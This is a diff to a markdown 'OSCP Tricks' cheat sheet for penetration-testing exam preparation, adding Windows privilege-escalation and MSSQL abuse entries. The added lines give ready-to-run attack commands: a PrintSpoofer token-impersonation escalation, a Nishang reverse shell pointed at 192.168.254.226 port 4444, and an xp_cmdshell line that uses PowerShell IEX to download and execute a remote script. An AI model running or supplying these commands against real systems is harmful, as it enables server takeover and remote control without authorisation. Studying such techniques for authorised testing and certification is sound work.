@@ -1,5 +1,5 @@
 # OSCP Tricks
-## Privilege Escalation
+## Privilege Escalation Linux
 ### Crontab
 #### Enumeration  
 ```
@@ -56,6 +56,14 @@ https://pentestmonkey.net/tools/audit/unix-privesc-check
 ```
 https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
 
+### Local Privilege Escalation Windows
+
+#### SeImpersonatePrivilege
+```
+PrintSpoofer64.exe -i -c cmd
+```
+https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
+
 ### Windows Enumeration Tools
 ```
 winPEASany.exe
@@ -71,6 +79,19 @@ https://github.com/pentestmonkey/windows-privesc-check
 Invoke-AllChecks
 ```
 https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
+
+### Abuse MSSQL
+-> edit Invoke-PowerShellTcp.ps1, adding this:  
+```
+Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
+```
+```
+impacket-mssqlclient <user>@<ip> -db <database>
+```
+```
+xp_cmdshell powershell IEX(New-Object Net.webclient).downloadString(\"http://<ip>/Invoke-PowerShellTcp.ps1\")
+```
+https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
 
 ## Client-Side Attacks
 ### HTA Attack in Action
@@ -148,7 +169,6 @@ Foreach($obj in $Result)
 ```
 
 #### Users currently logged on
-
 -> Enumerate logged users
 ```
 Import-Module .\PowerView.ps1
